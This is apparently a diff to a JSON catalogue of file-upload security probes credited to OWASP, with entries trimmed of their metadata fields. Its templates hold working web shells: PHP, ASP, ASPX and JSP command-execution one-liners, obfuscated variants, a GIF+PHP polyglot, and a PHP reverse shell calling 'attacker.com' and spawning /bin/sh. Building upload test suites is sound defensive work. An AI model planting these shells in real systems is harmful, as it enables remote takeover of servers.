-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0083",
-    "name": "Legitimate looking but with malicious content #4",
-    "template": "Content-Type: image/bmp",
-    "description": "Legitimate looking but with malicious content probe from OWASP. Tests application handling of: Content-Type: image/bmp",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0084",
-    "name": "Legitimate looking but with malicious content #5",
-    "template": "Content-Type: image/svg+xml",
-    "description": "Legitimate looking but with malicious content probe from OWASP. Tests application handling of: Content-Type: image/svg+xml",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0085",
-    "name": "Legitimate looking but with malicious content #6",
-    "template": "Content-Type: application/pdf",
-    "description": "Legitimate looking but with malicious content probe from OWASP. Tests application handling of: Content-Type: application/pdf",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0086",
-    "name": "Legitimate looking but with malicious content #7",
-    "template": "Content-Type: application/zip",
-    "description": "Legitimate looking but with malicious content probe from OWASP. Tests application handling of: Content-Type: application/zip",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0087",
-    "name": "Legitimate looking but with malicious content #8",
-    "template": "Content-Type: text/plain",
-    "description": "Legitimate looking but with malicious content probe from OWASP. Tests application handling of: Content-Type: text/plain",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0088",
-    "name": "Legitimate looking but with malicious content #9",
-    "template": "Content-Type: text/csv",
-    "description": "Legitimate looking but with malicious content probe from OWASP. Tests application handling of: Content-Type: text/csv",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0089",
-    "name": "Legitimate looking but with malicious content #10",
-    "template": "Content-Type: application/octet-stream",
-    "description": "Legitimate looking but with malicious content probe from OWASP. Tests application handling of: Content-Type: application/octe...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0090",
-    "name": "Legitimate looking but with malicious content #11",
-    "template": "Content-Type: video/mp4",
-    "description": "Legitimate looking but with malicious content probe from OWASP. Tests application handling of: Content-Type: video/mp4",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0091",
-    "name": "Legitimate looking but with malicious content #12",
-    "template": "Content-Type: audio/mpeg",
-    "description": "Legitimate looking but with malicious content probe from OWASP. Tests application handling of: Content-Type: audio/mpeg",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0092",
-    "name": "Empty or null",
-    "template": "Content-Type:",
-    "description": "Empty or null probe from OWASP. Tests application handling of: Content-Type:",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0093",
-    "name": "Empty or null #2",
-    "template": "Content-Type: null",
-    "description": "Empty or null probe from OWASP. Tests application handling of: Content-Type: null",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0094",
-    "name": "Empty or null #3",
-    "template": "Content-Type: undefined",
-    "description": "Empty or null probe from OWASP. Tests application handling of: Content-Type: undefined",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0095",
-    "name": "Malformed",
-    "template": "Content-Type: image/jpeg; charset=binary",
-    "description": "Malformed probe from OWASP. Tests application handling of: Content-Type: image/jpeg; char...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0096",
-    "name": "Malformed #2",
-    "template": "Content-Type: multipart/form-data; boundary=something",
-    "description": "Malformed probe from OWASP. Tests application handling of: Content-Type: multipart/form-d...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Server Config Files probe from OWASP. Tests application handling of: php.ini"
   },
   {
     "id": "file-upload-owasp-0097",
     "name": "PHP Web Shell with JPEG Header",
     "template": "FF D8 FF E0 (JPEG magic bytes)",
-    "description": "PHP Web Shell with JPEG Header probe from OWASP. Tests application handling of: FF D8 FF E0 (JPEG magic bytes)",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Web Shell with JPEG Header probe from OWASP. Tests application handling of: FF D8 FF E0 (JPEG magic bytes)"
   },
   {
     "id": "file-upload-owasp-0098",
     "name": "PHP Web Shell with JPEG Header #2",
     "template": "<?php system($_GET['cmd']); ?>",
-    "description": "PHP Web Shell with JPEG Header probe from OWASP. Tests application handling of: <?php system($_GET['cmd']); ?>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Web Shell with JPEG Header probe from OWASP. Tests application handling of: <?php system($_GET['cmd']); ?>"
   },
   {
     "id": "file-upload-owasp-0099",
     "name": "PHP Web Shell with PNG Header",
     "template": "89 50 4E 47 0D 0A 1A 0A (PNG magic bytes)",
-    "description": "PHP Web Shell with PNG Header probe from OWASP. Tests application handling of: 89 50 4E 47 0D 0A 1A 0A (PNG m...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Web Shell with PNG Header probe from OWASP. Tests application handling of: 89 50 4E 47 0D 0A 1A 0A (PNG m..."
   },
   {
     "id": "file-upload-owasp-0100",
     "name": "PHP Web Shell with GIF Header",
     "template": "GIF89a",
-    "description": "PHP Web Shell with GIF Header probe from OWASP. Tests application handling of: GIF89a",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Web Shell with GIF Header probe from OWASP. Tests application handling of: GIF89a"
   },
   {
     "id": "file-upload-owasp-0101",
     "name": "PHP Web Shell with PDF Header",
     "template": "%PDF-1.4",
-    "description": "PHP Web Shell with PDF Header probe from OWASP. Tests application handling of: %PDF-1.4",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Web Shell with PDF Header probe from OWASP. Tests application handling of: %PDF-1.4"
   },
   {
     "id": "file-upload-owasp-0102",
     "name": "PHP Web Shell with ZIP Header",
     "template": "PK (ZIP magic bytes)",
-    "description": "PHP Web Shell with ZIP Header probe from OWASP. Tests application handling of: PK (ZIP magic bytes)",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Web Shell with ZIP Header probe from OWASP. Tests application handling of: PK (ZIP magic bytes)"
   },
   {
     "id": "file-upload-owasp-0103",
     "name": "GIF + PHP Polyglot",
     "template": "GIF89a<?php system($_GET['cmd']); ?>",
-    "description": "GIF + PHP Polyglot probe from OWASP. Tests application handling of: GIF89a<?php system($_GET['cmd'...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "GIF + PHP Polyglot probe from OWASP. Tests application handling of: GIF89a<?php system($_GET['cmd'..."
   },
   {
     "id": "file-upload-owasp-0104",
     "name": "PHP Shell with POST",
     "template": "<?php system($_POST['cmd']); ?>",
-    "description": "PHP Shell with POST probe from OWASP. Tests application handling of: <?php system($_POST['cmd']); ?...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Shell with POST probe from OWASP. Tests application handling of: <?php system($_POST['cmd']); ?..."
   },
   {
     "id": "file-upload-owasp-0105",
     "name": "PHP Eval Shell",
     "template": "<?php eval($_REQUEST['cmd']); ?>",
-    "description": "PHP Eval Shell probe from OWASP. Tests application handling of: <?php eval($_REQUEST['cmd']); ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Eval Shell probe from OWASP. Tests application handling of: <?php eval($_REQUEST['cmd']); ..."
   },
   {
     "id": "file-upload-owasp-0106",
     "name": "PHP Passthru Shell",
     "template": "<?php passthru($_GET['cmd']); ?>",
-    "description": "PHP Passthru Shell probe from OWASP. Tests application handling of: <?php passthru($_GET['cmd']); ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Passthru Shell probe from OWASP. Tests application handling of: <?php passthru($_GET['cmd']); ..."
   },
   {
     "id": "file-upload-owasp-0107",
     "name": "PHP Exec Shell",
     "template": "<?php echo exec($_GET['cmd']); ?>",
-    "description": "PHP Exec Shell probe from OWASP. Tests application handling of: <?php echo exec($_GET['cmd']);...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Exec Shell probe from OWASP. Tests application handling of: <?php echo exec($_GET['cmd']);..."
   },
   {
     "id": "file-upload-owasp-0108",
     "name": "PHP Shell_exec",
     "template": "<?php echo shell_exec($_GET['cmd']); ?>",
-    "description": "PHP Shell_exec probe from OWASP. Tests application handling of: <?php echo shell_exec($_GET['c...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Shell_exec probe from OWASP. Tests application handling of: <?php echo shell_exec($_GET['c..."
   },
   {
     "id": "file-upload-owasp-0109",
     "name": "PHP Backdoor",
     "template": "<?php",
-    "description": "PHP Backdoor probe from OWASP. Tests application handling of: <?php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Backdoor probe from OWASP. Tests application handling of: <?php"
   },
   {
     "id": "file-upload-owasp-0110",
     "name": "PHP Backdoor #2",
     "template": "if(isset($_REQUEST['cmd'])){",
-    "description": "PHP Backdoor probe from OWASP. Tests application handling of: if(isset($_REQUEST['cmd'])){",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Backdoor probe from OWASP. Tests application handling of: if(isset($_REQUEST['cmd'])){"
   },
   {
     "id": "file-upload-owasp-0111",
     "name": "PHP Backdoor #3",
     "template": "echo \"<pre>\";",
-    "description": "PHP Backdoor probe from OWASP. Tests application handling of: echo \"<pre>\";",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Backdoor probe from OWASP. Tests application handling of: echo \"<pre>\";"
   },
   {
     "id": "file-upload-owasp-0112",
     "name": "PHP Backdoor #4",
     "template": "$cmd = ($_REQUEST['cmd']);",
-    "description": "PHP Backdoor probe from OWASP. Tests application handling of: $cmd = ($_REQUEST['cmd']);",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Backdoor probe from OWASP. Tests application handling of: $cmd = ($_REQUEST['cmd']);"
   },
   {
     "id": "file-upload-owasp-0113",
     "name": "PHP Backdoor #5",
     "template": "system($cmd);",
-    "description": "PHP Backdoor probe from OWASP. Tests application handling of: system($cmd);",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Backdoor probe from OWASP. Tests application handling of: system($cmd);"
   },
   {
     "id": "file-upload-owasp-0114",
     "name": "PHP Backdoor #6",
     "template": "echo \"</pre>\";",
-    "description": "PHP Backdoor probe from OWASP. Tests application handling of: echo \"</pre>\";",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Backdoor probe from OWASP. Tests application handling of: echo \"</pre>\";"
   },
   {
     "id": "file-upload-owasp-0115",
     "name": "PHP Backdoor #7",
     "template": "die;",
-    "description": "PHP Backdoor probe from OWASP. Tests application handling of: die;",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Backdoor probe from OWASP. Tests application handling of: die;"
   },
   {
     "id": "file-upload-owasp-0116",
     "name": "PHP Backdoor #8",
     "template": "}",
-    "description": "PHP Backdoor probe from OWASP. Tests application handling of: }",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Backdoor probe from OWASP. Tests application handling of: }"
   },
   {
     "id": "file-upload-owasp-0117",
     "name": "PHP Backdoor #9",
     "template": "?>",
-    "description": "PHP Backdoor probe from OWASP. Tests application handling of: ?>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Backdoor probe from OWASP. Tests application handling of: ?>"
   },
   {
     "id": "file-upload-owasp-0118",
     "name": "PHP File Manager Shell",
     "template": "if(isset($_GET['file'])){",
-    "description": "PHP File Manager Shell probe from OWASP. Tests application handling of: if(isset($_GET['file'])){",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP File Manager Shell probe from OWASP. Tests application handling of: if(isset($_GET['file'])){"
   },
   {
     "id": "file-upload-owasp-0119",
     "name": "PHP File Manager Shell #2",
     "template": "echo file_get_contents($_GET['file']);",
-    "description": "PHP File Manager Shell probe from OWASP. Tests application handling of: echo file_get_contents($_GET['...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP File Manager Shell probe from OWASP. Tests application handling of: echo file_get_contents($_GET['..."
   },
   {
     "id": "file-upload-owasp-0120",
     "name": "PHP File Manager Shell #3",
     "template": "if(isset($_FILES['upload'])){",
-    "description": "PHP File Manager Shell probe from OWASP. Tests application handling of: if(isset($_FILES['upload'])){",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP File Manager Shell probe from OWASP. Tests application handling of: if(isset($_FILES['upload'])){"
   },
   {
     "id": "file-upload-owasp-0121",
     "name": "PHP File Manager Shell #4",
     "template": "move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name']);",
-    "description": "PHP File Manager Shell probe from OWASP. Tests application handling of: move_uploaded_file($_FILES['up...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP File Manager Shell probe from OWASP. Tests application handling of: move_uploaded_file($_FILES['up..."
   },
   {
     "id": "file-upload-owasp-0122",
     "name": "PHP One-liner Shells",
     "template": "<?=`$_GET[x]`?>",
-    "description": "PHP One-liner Shells probe from OWASP. Tests application handling of: <?=`$_GET[x]`?>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP One-liner Shells probe from OWASP. Tests application handling of: <?=`$_GET[x]`?>"
   },
   {
     "id": "file-upload-owasp-0123",
     "name": "PHP One-liner Shells #2",
     "template": "<?=system($_GET[x]);?>",
-    "description": "PHP One-liner Shells probe from OWASP. Tests application handling of: <?=system($_GET[x]);?>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP One-liner Shells probe from OWASP. Tests application handling of: <?=system($_GET[x]);?>"
   },
   {
     "id": "file-upload-owasp-0124",
     "name": "PHP One-liner Shells #3",
     "template": "<?=shell_exec($_GET[x]);?>",
-    "description": "PHP One-liner Shells probe from OWASP. Tests application handling of: <?=shell_exec($_GET[x]);?>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP One-liner Shells probe from OWASP. Tests application handling of: <?=shell_exec($_GET[x]);?>"
   },
   {
     "id": "file-upload-owasp-0125",
     "name": "PHP One-liner Shells #4",
     "template": "<?=passthru($_GET[x]);?>",
-    "description": "PHP One-liner Shells probe from OWASP. Tests application handling of: <?=passthru($_GET[x]);?>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP One-liner Shells probe from OWASP. Tests application handling of: <?=passthru($_GET[x]);?>"
   },
   {
     "id": "file-upload-owasp-0126",
     "name": "PHP One-liner Shells #5",
     "template": "<?=exec($_GET[x]);?>",
-    "description": "PHP One-liner Shells probe from OWASP. Tests application handling of: <?=exec($_GET[x]);?>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP One-liner Shells probe from OWASP. Tests application handling of: <?=exec($_GET[x]);?>"
   },
   {
     "id": "file-upload-owasp-0127",
     "name": "Obfuscated PHP Shell",
     "template": "<?php $a=$_GET['a'];$b=$_GET['b'];$a($b);?>",
-    "description": "Obfuscated PHP Shell probe from OWASP. Tests application handling of: <?php $a=$_GET['a'];$b=$_GET['...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Obfuscated PHP Shell probe from OWASP. Tests application handling of: <?php $a=$_GET['a'];$b=$_GET['..."
   },
   {
     "id": "file-upload-owasp-0128",
     "name": "Obfuscated PHP Shell #2",
     "template": "<?php @eval($_POST['x']);?>",
-    "description": "Obfuscated PHP Shell probe from OWASP. Tests application handling of: <?php @eval($_POST['x']);?>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Obfuscated PHP Shell probe from OWASP. Tests application handling of: <?php @eval($_POST['x']);?>"
   },
   {
     "id": "file-upload-owasp-0129",
     "name": "Obfuscated PHP Shell #3",
     "template": "<?php @assert($_POST['x']);?>",
-    "description": "Obfuscated PHP Shell probe from OWASP. Tests application handling of: <?php @assert($_POST['x']);?>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Obfuscated PHP Shell probe from OWASP. Tests application handling of: <?php @assert($_POST['x']);?>"
   },
   {
     "id": "file-upload-owasp-0130",
     "name": "Obfuscated PHP Shell #4",
     "template": "<?php $f='sys'.'tem';$f($_GET['x']);?>",
-    "description": "Obfuscated PHP Shell probe from OWASP. Tests application handling of: <?php $f='sys'.'tem';$f($_GET[...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Obfuscated PHP Shell probe from OWASP. Tests application handling of: <?php $f='sys'.'tem';$f($_GET[..."
   },
   {
     "id": "file-upload-owasp-0131",
     "name": "PHP Reverse Shell",
     "template": "$sock=fsockopen(\"attacker.com\",4444);",
-    "description": "PHP Reverse Shell probe from OWASP. Tests application handling of: $sock=fsockopen(\"attacker.com\"...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Reverse Shell probe from OWASP. Tests application handling of: $sock=fsockopen(\"attacker.com\"..."
   },
   {
     "id": "file-upload-owasp-0132",
     "name": "PHP Reverse Shell #2",
     "template": "exec(\"/bin/sh -i <&3 >&3 2>&3\");",
-    "description": "PHP Reverse Shell probe from OWASP. Tests application handling of: exec(\"/bin/sh -i <&3 >&3 2>&3\"...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PHP Reverse Shell probe from OWASP. Tests application handling of: exec(\"/bin/sh -i <&3 >&3 2>&3\"..."
   },
   {
     "id": "file-upload-owasp-0133",
     "name": "ASP Shell",
     "template": "<%",
-    "description": "ASP Shell probe from OWASP. Tests application handling of: <%",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASP Shell probe from OWASP. Tests application handling of: <%"
   },
   {
     "id": "file-upload-owasp-0134",
     "name": "ASP Shell #2",
     "template": "Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\")",
-    "description": "ASP Shell probe from OWASP. Tests application handling of: Set oScript = Server.CreateObj...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASP Shell probe from OWASP. Tests application handling of: Set oScript = Server.CreateObj..."
   },
   {
     "id": "file-upload-owasp-0135",
     "name": "ASP Shell #3",
     "template": "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")",
-    "description": "ASP Shell probe from OWASP. Tests application handling of: Set oFileSys = Server.CreateOb...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASP Shell probe from OWASP. Tests application handling of: Set oFileSys = Server.CreateOb..."
   },
   {
     "id": "file-upload-owasp-0136",
     "name": "ASP Shell #4",
     "template": "Response.Write(oScript.Exec(\"cmd /c \" & Request.QueryString(\"cmd\")).StdOut.ReadAll())",
-    "description": "ASP Shell probe from OWASP. Tests application handling of: Response.Write(oScript.Exec(\"c...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASP Shell probe from OWASP. Tests application handling of: Response.Write(oScript.Exec(\"c..."
   },
   {
     "id": "file-upload-owasp-0137",
     "name": "ASP Shell #5",
     "template": "%>",
-    "description": "ASP Shell probe from OWASP. Tests application handling of: %>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASP Shell probe from OWASP. Tests application handling of: %>"
   },
   {
     "id": "file-upload-owasp-0138",
     "name": "ASPX Shell",
     "template": "<%@ Page Language=\"C#\" %>",
-    "description": "ASPX Shell probe from OWASP. Tests application handling of: <%@ Page Language=\"C#\" %>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASPX Shell probe from OWASP. Tests application handling of: <%@ Page Language=\"C#\" %>"
   },
   {
     "id": "file-upload-owasp-0139",
     "name": "ASPX Shell #2",
     "template": "<%@ Import Namespace=\"System.Diagnostics\" %>",
-    "description": "ASPX Shell probe from OWASP. Tests application handling of: <%@ Import Namespace=\"System.D...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASPX Shell probe from OWASP. Tests application handling of: <%@ Import Namespace=\"System.D..."
   },
   {
     "id": "file-upload-owasp-0140",
     "name": "ASPX Shell #3",
     "template": "<script runat=\"server\">",
-    "description": "ASPX Shell probe from OWASP. Tests application handling of: <script runat=\"server\">",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASPX Shell probe from OWASP. Tests application handling of: <script runat=\"server\">"
   },
   {
     "id": "file-upload-owasp-0141",
     "name": "ASPX Shell #4",
     "template": "void Page_Load(object sender, EventArgs e){",
-    "description": "ASPX Shell probe from OWASP. Tests application handling of: void Page_Load(object sender, ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASPX Shell probe from OWASP. Tests application handling of: void Page_Load(object sender, ..."
   },
   {
     "id": "file-upload-owasp-0142",
     "name": "ASPX Shell #5",
     "template": "Process p = new Process();",
-    "description": "ASPX Shell probe from OWASP. Tests application handling of: Process p = new Process();",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASPX Shell probe from OWASP. Tests application handling of: Process p = new Process();"
   },
   {
     "id": "file-upload-owasp-0143",
     "name": "ASPX Shell #6",
     "template": "p.StartInfo.FileName = \"cmd.exe\";",
-    "description": "ASPX Shell probe from OWASP. Tests application handling of: p.StartInfo.FileName = \"cmd.ex...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASPX Shell probe from OWASP. Tests application handling of: p.StartInfo.FileName = \"cmd.ex..."
   },
   {
     "id": "file-upload-owasp-0144",
     "name": "ASPX Shell #7",
     "template": "p.StartInfo.Arguments = \"/c \" + Request.QueryString[\"cmd\"];",
-    "description": "ASPX Shell probe from OWASP. Tests application handling of: p.StartInfo.Arguments = \"/c \" ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASPX Shell probe from OWASP. Tests application handling of: p.StartInfo.Arguments = \"/c \" ..."
   },
   {
     "id": "file-upload-owasp-0145",
     "name": "ASPX Shell #8",
     "template": "p.StartInfo.RedirectStandardOutput = true;",
-    "description": "ASPX Shell probe from OWASP. Tests application handling of: p.StartInfo.RedirectStandardOu...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASPX Shell probe from OWASP. Tests application handling of: p.StartInfo.RedirectStandardOu..."
   },
   {
     "id": "file-upload-owasp-0146",
     "name": "ASPX Shell #9",
     "template": "p.StartInfo.UseShellExecute = false;",
-    "description": "ASPX Shell probe from OWASP. Tests application handling of: p.StartInfo.UseShellExecute = ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASPX Shell probe from OWASP. Tests application handling of: p.StartInfo.UseShellExecute = ..."
   },
   {
     "id": "file-upload-owasp-0147",
     "name": "ASPX Shell #10",
     "template": "p.Start();",
-    "description": "ASPX Shell probe from OWASP. Tests application handling of: p.Start();",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASPX Shell probe from OWASP. Tests application handling of: p.Start();"
   },
   {
     "id": "file-upload-owasp-0148",
     "name": "ASPX Shell #11",
     "template": "Response.Write(p.StandardOutput.ReadToEnd());",
-    "description": "ASPX Shell probe from OWASP. Tests application handling of: Response.Write(p.StandardOutpu...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASPX Shell probe from OWASP. Tests application handling of: Response.Write(p.StandardOutpu..."
   },
   {
     "id": "file-upload-owasp-0149",
     "name": "ASPX Shell #12",
     "template": "</script>",
-    "description": "ASPX Shell probe from OWASP. Tests application handling of: </script>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASPX Shell probe from OWASP. Tests application handling of: </script>"
   },
   {
     "id": "file-upload-owasp-0150",
     "name": "ASPX One-liner",
     "template": "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"cmd\"],\"unsafe\");%>",
-    "description": "ASPX One-liner probe from OWASP. Tests application handling of: <%@ Page Language=\"Jscript\"%><...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ASPX One-liner probe from OWASP. Tests application handling of: <%@ Page Language=\"Jscript\"%><..."
   },
   {
     "id": "file-upload-owasp-0151",
     "name": "JSP Shell",
     "template": "<%@ page import=\"java.io.*\" %>",
-    "description": "JSP Shell probe from OWASP. Tests application handling of: <%@ page import=\"java.io.*\" %>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "JSP Shell probe from OWASP. Tests application handling of: <%@ page import=\"java.io.*\" %>"
   },
   {
     "id": "file-upload-owasp-0152",
     "name": "JSP Shell #2",
     "template": "String cmd = request.getParameter(\"cmd\");",
-    "description": "JSP Shell probe from OWASP. Tests application handling of: String cmd = request.getParame...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "JSP Shell probe from OWASP. Tests application handling of: String cmd = request.getParame..."
   },
   {
     "id": "file-upload-owasp-0153",
     "name": "JSP Shell #3",
     "template": "Process p = Runtime.getRuntime().exec(cmd);",
-    "description": "JSP Shell probe from OWASP. Tests application handling of: Process p = Runtime.getRuntime...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "JSP Shell probe from OWASP. Tests application handling of: Process p = Runtime.getRuntime..."
   },
   {
     "id": "file-upload-owasp-0154",
     "name": "JSP Shell #4",
     "template": "InputStream in = p.getInputStream();",
-    "description": "JSP Shell probe from OWASP. Tests application handling of: InputStream in = p.getInputStr...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "JSP Shell probe from OWASP. Tests application handling of: InputStream in = p.getInputStr..."
   },
   {
     "id": "file-upload-owasp-0155",
     "name": "JSP Shell #5",
     "template": "int i;",
-    "description": "JSP Shell probe from OWASP. Tests application handling of: int i;",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "JSP Shell probe from OWASP. Tests application handling of: int i;"
   },
   {
     "id": "file-upload-owasp-0156",
     "name": "JSP Shell #6",
     "template": "while((i = in.read()) != -1) {",
-    "description": "JSP Shell probe from OWASP. Tests application handling of: while((i = in.read()) != -1) {",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "JSP Shell probe from OWASP. Tests application handling of: while((i = in.read()) != -1) {"
   },
   {
     "id": "file-upload-owasp-0157",
     "name": "JSP Shell #7",
     "template": "out.print((char)i);",
-    "description": "JSP Shell probe from OWASP. Tests application handling of: out.print((char)i);",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "JSP Shell probe from OWASP. Tests application handling of: out.print((char)i);"
   },
   {
     "id": "file-upload-owasp-0158",
     "name": "JSP One-liner",
